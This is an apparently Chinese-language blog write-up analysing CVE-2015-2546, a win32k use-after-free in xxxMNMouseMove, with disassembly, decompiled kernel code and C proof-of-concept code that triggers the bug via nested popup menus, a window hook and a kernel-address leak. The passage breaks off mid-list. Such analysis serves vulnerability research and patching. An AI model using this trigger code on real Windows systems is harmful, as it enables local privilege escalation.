    <content type="html"><![CDATA[<h2 id="0x00-前言及原因分析"><a href="#0x00-前言及原因分析" class="headerlink" title="0x00 前言及原因分析"></a>0x00 前言及原因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2015-2546是发生在<code>win32k!xxxMNMouseMove</code>函数的一个释放后重引用漏洞(UAF),在<code>win32k!xxxMNMouseMove</code>中调用xxxSendMessage发送<code>MN_SELECTITEM(0x1E5)</code>和<code>MN_SETTIMERTOOPENHIERARCHY(0x1F0)</code>消息的时候，执行流可能会回调进入用户侧，当执行流从用户侧返回之后，<code>win32k!xxxMNMouseMove</code>函数并没有对<code>tagPopupMenu</code>对象进行校验，就将其传入<code>win32k!xxxMNHideNextHierarchy</code>对其进行了访问，从而引用UAF。</p><a id="more"></a><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8263</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">Src</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8264</span> 004                 <span class="selector-tag">push</span>    <span class="selector-attr">[ebp+cmdItem]</span>   ; <span class="selector-tag">WideCharString</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8267</span> 008                 <span class="selector-tag">push</span>    1<span class="selector-tag">E5h</span>            ; <span class="selector-tag">message</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB826C</span> 00<span class="selector-tag">C</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">esi</span>             ; <span class="selector-tag">P</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB826D</span> 010                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8272</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">al</span>, 10<span class="selector-tag">h</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8274</span> 000                 <span class="selector-tag">jz</span>      <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8276</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">al</span>, 3</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8278</span> 000                 <span class="selector-tag">jnz</span>     <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827A</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">Src</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827B</span> 004                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">WideCharString</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827C</span> 008                 <span class="selector-tag">push</span>    1<span class="selector-tag">F0h</span>            ; <span class="selector-tag">message</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8281</span> 00<span class="selector-tag">C</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">esi</span>             ; <span class="selector-tag">P</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8282</span> 010                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8287</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">eax</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8289</span> 000                 <span class="selector-tag">jnz</span>     <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB828B</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span>             ; <span class="selector-tag">a1</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB828C</span> 004                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxMNHideNextHierarchy</span>@<span class="keyword">4</span> ; <span class="selector-tag">xxxMNHideNextHierarchy</span>(<span class="selector-tag">x</span>)</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果在执行流回到用户侧时，销毁目标菜单对象，然后在经过巧妙的内存布局，使系统重新分配内存重新占用销毁的目标菜单对象所占据的内存，然后通过巧妙的伪装，在<code>Win32k!xxxMNHideNextHierarchy</code>调用发送<code>MN_SELECTITEM(0x1E5)</code>消息，从而像CVE-2014-4113一样，执行预先设置好的ShellCode提权代码。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">int</span> __stdcall xxxMNHideNextHierarchy(tagPOPUPMENU *<span class="built_in">a1</span>)</div><div class="line">&#123;</div><div class="line">  tagWND *<span class="built_in">v1</span><span class="comment">; // eax</span></div><div class="line">  tagWND *<span class="built_in">v2</span><span class="comment">; // eax</span></div><div class="line">  int <span class="built_in">v4</span>[<span class="number">3</span>]<span class="comment">; // [esp+4h] [ebp-Ch] BYREF</span></div><div class="line">  <span class="built_in">v1</span> = <span class="built_in">a1</span>-&gt;spwndNextPopup<span class="comment">;                      // 需要两个菜单</span></div><div class="line">  <span class="meta">if</span> ( !<span class="built_in">v1</span> )</div><div class="line">    return <span class="number">0</span><span class="comment">;</span></div><div class="line">  <span class="built_in">v4</span>[<span class="number">0</span>] = *(gptiCurrent + <span class="number">45</span>)<span class="comment">;</span></div><div class="line">  *(gptiCurrent + <span class="number">45</span>) = <span class="built_in">v4</span><span class="comment">;</span></div><div class="line">  <span class="built_in">v4</span>[<span class="number">1</span>] = <span class="built_in">v1</span><span class="comment">;</span></div><div class="line">  ++<span class="built_in">v1</span>-&gt;head.cLockObj<span class="comment">;</span></div><div class="line">  <span class="built_in">v2</span> = <span class="built_in">a1</span>-&gt;spwndNextPopup<span class="comment">;</span></div><div class="line">  <span class="meta">if</span> ( <span class="built_in">v2</span> != <span class="built_in">a1</span>-&gt;spwndActivePopup )             // 判断是否是活跃菜单</div><div class="line">    xxxSendMessage(<span class="built_in">v2</span>, <span class="number">0x1E4</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">  xxxSendMessage(<span class="built_in">a1</span>-&gt;spwndNextPopup, <span class="number">0x1E5</span>, -<span class="number">1</span>, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">  return <span class="number">1</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x01-Poc构建"><a href="#0x01-Poc构建" class="headerlink" title="0x01 Poc构建"></a>0x01 Poc构建</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和CVE-2014-4113一样，触发CVE-2015-2546的<code>win32k!xxxMNMouseMove</code>函数也是在<code>win32k!xxxHandleMenuMessages</code>被调用。在代码88行调用<code>xxxMNMouseMove(v3, pMenuState, v7);</code>触发CVE-2015-2546,而在56行，调用<code>xxxSendMessage(v13, 0x1ED, tagPopupMenu, 0);</code>触发CVE-2014-4113。通过观察代码逻辑，在18行，如果v23不等于0的话，则不会调用<code>xxxMNMouseMove(v3, pMenuState, v7);</code>，所以网上追溯，当message为<code>0x200(WM_MOUSEMOVE)</code>的时候，就会执行<code>xxxMNMouseMove(v3, pMenuState, v7);</code>，所以只要主窗口发送<code>WM_MOUSEMOVE</code>消息的时候就会调用<code>xxxMNMouseMove</code>。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line"><span class="built_in"> if </span>( message &gt; 0x104 )                        // CVE-2014-4113 条件2</div><div class="line">  &#123;</div><div class="line">   <span class="built_in"> if </span>( message &lt;= 0x202 )                     // CVE-2014-4113 条件3</div><div class="line">    &#123;</div><div class="line">     <span class="built_in"> if </span>( message == 0x202 )</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_79;</span></div><div class="line">      v20 = message - 0x105;                    // CVE-2014-4113<span class="keyword"> :</span> message = 0xFC + 0x105 = 0x201(WM_LBUTTONDOWN)</div><div class="line">                                                // CVE-2015-2546<span class="keyword"> :</span> message = 0xFB + 0x105 = 0x200(WM_MOUSEMOVE)</div><div class="line">     <span class="built_in"> if </span>( v20 )                                // 条件2&lt;----CVE-2015-2546</div><div class="line">      &#123;</div><div class="line">        v21 = v20 - 1;                          // v20 = 0xFB + 0x1  = 0xFC</div><div class="line">       <span class="built_in"> if </span>( v21 )</div><div class="line">        &#123;</div><div class="line">          v22 = v21 - 0x12;                     // v21 = 0xE9 + 0x12 = 0xFB</div><div class="line">         <span class="built_in"> if </span>( !v22 )</div><div class="line">           <span class="built_in"> return </span>1;</div><div class="line">          v23 = v22 - 0xE8;                     // 0xE8 + 1 = 0xE9</div><div class="line">         <span class="built_in"> if </span>( v23 )                            // CVE-2015-2546 v23 == 0 否则不会触发</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( v23 == 1 )</div><div class="line">            &#123;</div><div class="line">LABEL_13:</div><div class="line">              v12 = pMenuState;</div><div class="line">              pMenuState[4] = -1;</div><div class="line">              pMenuState[2] = v7;</div><div class="line">              pMenuState[3] = SHIWORD(v7);</div><div class="line">              v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);</div><div class="line">              pMenuStatea = IsMFMWFPWindow(v13);</div><div class="line">             <span class="built_in"> if </span>( pMenuStatea )</div><div class="line">              &#123;</div><div class="line">                v40 = *(gptiCurrent + 45);</div><div class="line">                *(gptiCurrent + 45) = &amp;v40;</div><div class="line">                v41 = v13;</div><div class="line">               <span class="built_in"> if </span>( v13 )</div><div class="line">                  ++*(v13 + 4);</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x400) != 0 )</div><div class="line">              &#123;</div><div class="line">                v12[9] = v12[2];</div><div class="line">                v12[10] = v12[3];</div><div class="line">                v12[12] = tagPopupMenu;</div><div class="line">                LockMFMWFPWindow(v12 + 0xB, v13);</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x500) != 0 )</div><div class="line">                v12[13] = ((v44 &amp; 2) != 0) + 1;</div><div class="line">             <span class="built_in"> if </span>( !v13 &amp;&amp; !tagPopupMenu )</div><div class="line">               <span class="built_in"> goto </span><span class="class">LABEL_22;</span></div><div class="line">             <span class="built_in"> if </span>( (*v3 &amp; 2) != 0 &amp;&amp; v13 == -5 )</div><div class="line">              &#123;</div><div class="line">                xxxMNSwitchToAlternateMenu(v3);</div><div class="line">                v13 = -1;</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( v13 == -1 )</div><div class="line">                xxxMNButtonDown(v3, v12, tagPopupMenu, 1);</div><div class="line">              else                              // 可能为-5</div><div class="line">                xxxSendMessage(v13, 0x1ED, tagPopupMenu, 0);// &lt;------CVE-2014-4113</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x100) == 0 )</div><div class="line">                xxxMNRemoveMessage(tagMsg-&gt;message, 516);</div><div class="line">LABEL_127:</div><div class="line">             <span class="built_in"> if </span>( !pMenuStatea )</div><div class="line">               <span class="built_in"> return </span>1;</div><div class="line">             <span class="built_in"> goto </span><span class="class">LABEL_142;</span></div><div class="line">            &#125;</div><div class="line">           <span class="built_in"> return </span>0;</div><div class="line">          &#125;</div><div class="line">LABEL_58:                                       // message  == 0x200(WM_MOUSEMOVE)</div><div class="line">          v24 = pMenuState[1];                  // 条件1&lt;------CVE-2015-2546</div><div class="line">         <span class="built_in"> if </span>( (v24 &amp; 0x400) != 0 &amp;&amp; (v24 &amp; 8) != 0 &amp;&amp; (v24 &amp; 0xC0) == 0 )</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( pMenuState[11] )</div><div class="line">            &#123;</div><div class="line">              v38[0] = pMenuState[9];</div><div class="line">              v38[1] = pMenuState[10];</div><div class="line">              v38[2] = pMenuState[9];</div><div class="line">              v38[3] = pMenuState[10];</div><div class="line">              InflateRect(v38, *(gpsi + 1760), *(gpsi + 1764));</div><div class="line">             <span class="built_in"> if </span>( !PtInRect(v38, v7, SHIWORD(v7)) )</div><div class="line">              &#123;</div><div class="line">                v25 = GetMenuStateWindow(pMenuState);</div><div class="line">               <span class="built_in"> if </span>( v25 )</div><div class="line">                &#123;</div><div class="line">                  pMenuState[1] |= 0x80u;</div><div class="line">                  _PostMessage(v25, 500, 0, 0);</div><div class="line">                &#125;</div><div class="line">              &#125;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          xxxMNMouseMove(v3, pMenuState, v7);   // &lt;----CVE-2015-2546</div><div class="line">         <span class="built_in"> return </span>1;</div><div class="line">        &#125;</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">      &#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNMouseMove</code>作用是处理鼠标移动的消息,首先判断传入的PopupMenu对象是否是根弹出菜单对象，然后检查坐标是否发生移动，继而通过<code>xxxMNFindWindowFromPoint(ppopupmenu, &amp;cmdItem, *&amp;ptScreen_);</code>获取菜单窗口对象。如果是有效的菜单窗口对象，会判断该窗口对象是否被销毁，然后将获取到的窗口对象作为参数，传入<code>xxxSendMessage</code>发送<code>MN_SELECTITEM(0x1E5)</code>消息以选择菜单项，当返回的uFlag为<code>MF_POPUP</code>以及不为<code>MFS_GRAYED</code>，并且调用<code>xxxSendMessage</code>发送<code>MN_SETTIMERTOOPENHIERARCHY</code>消息不为0的时候，则调用<code>xxxMNHideNextHierarchy</code>函数以关闭弹出窗口的子菜单。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">void __stdcall xxxMNMouseMove(tagPOPUPMENU *cmdItem, tagMENUSTATE *pMenuState, POINTS ptScreen)</div><div class="line">&#123;</div><div class="line">  ppopupmenu = cmdItem;</div><div class="line">  if ( ppopupmenu == ppopupmenu-&gt;ppopupmenuRoot )<span class="comment">// tagPOPUPMENU 对象是否为当前的根弹出菜单对象</span></div><div class="line">  &#123;</div><div class="line">    ptScreen_ = ptScreen;</div><div class="line">    pMenuState_ = pMenuState;</div><div class="line">    if ( ptScreen.x != pMenuState-&gt;ptMouseLast.x || ptScreen.y != pMenuState-&gt;ptMouseLast.y ) <span class="comment">//检查坐标是否发生移动</span></div><div class="line">    &#123;</div><div class="line">      pMenuState-&gt;ptMouseLast.x = ptScreen.x;</div><div class="line">      pMenuState_-&gt;ptMouseLast.y = ptScreen_.y;</div><div class="line">      cmdHitArea = xxxMNFindWindowFromPoint(ppopupmenu, &amp;cmdItem, *&amp;ptScreen_);</div><div class="line">[...]</div><div class="line">      else                                      <span class="comment">// CVE-2015-2546条件3</span></div><div class="line">      &#123;</div><div class="line">        if ( cmdHitArea_1 == <span class="number">-1</span> )               <span class="comment">// if (cmdHitArea == MFMWFP_NOITEM) </span></div><div class="line">          goto LABEL_15;</div><div class="line">        if ( cmdHitArea_1 )                     <span class="comment">// 如果是菜单窗口对象的话</span></div><div class="line">                                                <span class="comment">// 条件2</span></div><div class="line">        &#123;</div><div class="line">          if ( IsWindowBeingDestroyed(cmdHitArea_1) )<span class="comment">// &lt;----CVE-2015-2546 返回为0即可</span></div><div class="line">            return;</div><div class="line">          v15 = *(gptiCurrent + <span class="number">45</span>);</div><div class="line">          *(gptiCurrent + <span class="number">45</span>) = &amp;v15;</div><div class="line">          v16 = cmdHitArea_1;</div><div class="line">          ++*(cmdHitArea_1 + <span class="number">4</span>);</div><div class="line">          v8 = *(pMenuState_ + <span class="number">1</span>);</div><div class="line">          popupmenu_ = *(cmdHitArea_1 + <span class="number">0xB0</span>);</div><div class="line">          if ( (v8 &amp; <span class="number">0x100</span>) != <span class="number">0</span> &amp;&amp; (v8 &amp; <span class="number">0x8000</span>) == <span class="number">0</span> &amp;&amp; (*popupmenu_ &amp; <span class="number">0x100000</span>) == <span class="number">0</span> )<span class="comment">// </span></div><div class="line">                                                <span class="comment">// if (pMenuState-&gt;fModelessMenu</span></div><div class="line">                                                <span class="comment">//     &amp;&amp; !pMenuState-&gt;fInDoDragDrop</span></div><div class="line">                                                <span class="comment">//     &amp;&amp; !ppopup-&gt;fTrackMouseEvent)</span></div><div class="line">          &#123;</div><div class="line">            v14 = *cmdHitArea_1;</div><div class="line">            v13 = <span class="number">2</span>;</div><div class="line">            TrackMouseEvent(&amp;v12);</div><div class="line">            *popupmenu_ |= <span class="number">0x100000</span>u;</div><div class="line">            xxxSendMessage(cmdHitArea_1, <span class="number">0x20</span>, *cmdHitArea_1, <span class="number">2</span>);</div><div class="line">          &#125;</div><div class="line">          v10 = xxxSendMessage(cmdHitArea_1, <span class="number">0x1E5</span>, cmdItem, <span class="number">0</span>);<span class="comment">// MN_SELECTITEM</span></div><div class="line">          if ( (v10 &amp; <span class="number">0x10</span>) != <span class="number">0</span> &amp;&amp; (v10 &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; !xxxSendMessage(cmdHitArea_1, <span class="number">0x1F0</span>, <span class="number">0</span>, <span class="number">0</span>) )<span class="comment">// MN_SETTIMERTOOPENHIERARCHY</span></div><div class="line">            xxxMNHideNextHierarchy(popupmenu_); <span class="comment">// &lt;-----CVE-2015-5246 通过人为构造内存进行触发</span></div><div class="line">          goto LABEL_28;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">[...]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>xxxMNHideNextHierarchy</code>函数逻辑就很简单了，只需要判断传入的ppopupmenu的弹出子菜单是否是活跃的弹出菜单之后，调用<code>xxxSendMessage</code>发送<code>MN_CLOSEHIERARCHY</code>消息关闭弹出菜单。然后接着发送<code>MN_SELECTITEM</code>消息继续选择菜单。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> xxxMNHideNextHierarchy(</div><div class="line">    PPOPUPMENU ppopup)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (ppopup-&gt;spwndNextPopup != <span class="keyword">NULL</span>) &#123;</div><div class="line">[...]</div><div class="line">        <span class="keyword">if</span> (ppopup-&gt;spwndNextPopup != ppopup-&gt;spwndActivePopup)</div><div class="line">            xxxSendMessage(ppopup-&gt;spwndNextPopup, MN_CLOSEHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L);</div><div class="line">        xxxSendMessage(ppopup-&gt;spwndNextPopup, MN_SELECTITEM, (WPARAM)<span class="number">-1</span>, <span class="number">0</span>L);</div><div class="line">        ThreadUnlock(&amp;tlpwndT);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述对于<code>win32k!xxxHandleMenuMessages</code>描述，CVE-2015-2546和CVE-2014-4113漏洞都产生于<code>xxxHandleMenuMessages</code>。其不同点在于，CVE-2014-4113的message为WM_LBUTTONDOWN(0x201),而CVE-2015-2546的message为WM_MOUSEMOVE(0x200)。我们都可以复用CVE-2014-4113的poc代码如下。需要改动的地方就是主窗口的WndProc函数。需要其发送WM_MOUSEMOVE(0x200)消息，以使执行流进入<code>xxxMNMouseMove</code><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">BOOL poc_cve_2015_2546()</div><div class="line">&#123;</div><div class="line"><span class="comment">//创建一个主窗口</span></div><div class="line">HWND        hWnd;</div><div class="line">WNDCLASS    wc;</div><div class="line">memset(&amp;wc, <span class="number">0</span>, sizeof(wc));</div><div class="line">wc.lpfnWndProc = WndProc;</div><div class="line">wc.lpszClassName = <span class="string">"CVE-2015-2546"</span>;</div><div class="line">RegisterClassA(&amp;wc);</div><div class="line">hWnd = CreateWindowExA(<span class="number">0</span>, wc.lpszClassName, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">if (hWnd == NULL)</div><div class="line">&#123;</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">PTHRDESKHEAD thrdeskhead_wnd = pHmValidateHandle(hWnd, <span class="number">1</span>);</div><div class="line">PVOID tagWnd = thrdeskhead_wnd-&gt;pSelf;</div><div class="line">printf(<span class="string">"[+] tagWnd in Kernel Address : 0x%p<span class="subst">\n</span>"</span>, tagWnd);</div><div class="line"><span class="comment">//创建一个菜单，并插入</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">MENUITEMINFOA MenuOneInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">MenuOneInfo.cbSize = sizeof(MENUITEMINFOA);</div><div class="line">MenuOneInfo.fMask = MIIM_STRING;</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line"><span class="comment">//创建第二个菜单，并插入</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">MENUITEMINFOA MenuTwoInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">MenuTwoInfo.cbSize = sizeof(MENUITEMINFOA);</div><div class="line">MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);</div><div class="line">MenuTwoInfo.hSubMenu = MenuOne;</div><div class="line">MenuTwoInfo.dwTypeData = (LPSTR)<span class="string">""</span>;</div><div class="line">MenuTwoInfo.cch = <span class="number">1</span>;</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//设置消息钩子</span></div><div class="line">HHOOK setWindowsHook = SetWindowsHookExA(WH_CALLWNDPROC, WndProcHook, NULL, GetCurrentThreadId());</div><div class="line"><span class="comment">//触发漏洞</span></div><div class="line">TrackPopupMenu(</div><div class="line">MenuTwo,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line">hWnd,</div><div class="line">NULL);</div><div class="line">return <span class="literal">TRUE</span>;</div><div class="line">&#125;</div><div class="line">[........]</div><div class="line">LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</div><div class="line">&#123;</div><div class="line">if (uMsg == WM_ENTERIDLE)</div><div class="line">&#123;</div><div class="line">PostMessageA(hWnd, WM_KEYDOWN, VK_DOWN, <span class="number">0</span>);</div><div class="line">PostMessageA(hWnd, WM_KEYDOWN, VK_RIGHT, <span class="number">0</span>);</div><div class="line">PostMessageA(hWnd, WM_MOUSEMOVE, <span class="number">0</span>, <span class="number">1</span>);</div><div class="line"><span class="comment">//PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0); CVE-2014-4113</span></div><div class="line">&#125;</div><div class="line">return DefWindowProcA(hWnd, uMsg, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kd&gt; kn</div><div class="line"> # ChildEBP RetAddr      </div><div class="line"><span class="number">00</span> <span class="number">968</span>d7b90 <span class="number">95</span>ab7db0     win32k!xxxMNMouseMove</div><div class="line"><span class="number">01</span> <span class="number">968</span>d7bec <span class="number">95</span>aafa64     win32k!xxxHandleMenuMessages+<span class="number">0x2ed</span></div><div class="line"><span class="number">02</span> <span class="number">968</span>d7c38 <span class="number">95</span>abf71b     win32k!xxxMNLoop+<span class="number">0x2c6</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>xxxMNMouseMove</code>中，要触发漏洞，需要有4个条件,根据调试，第一个条件自动满足。</p><ul><li>1.tagPOPUPMENU 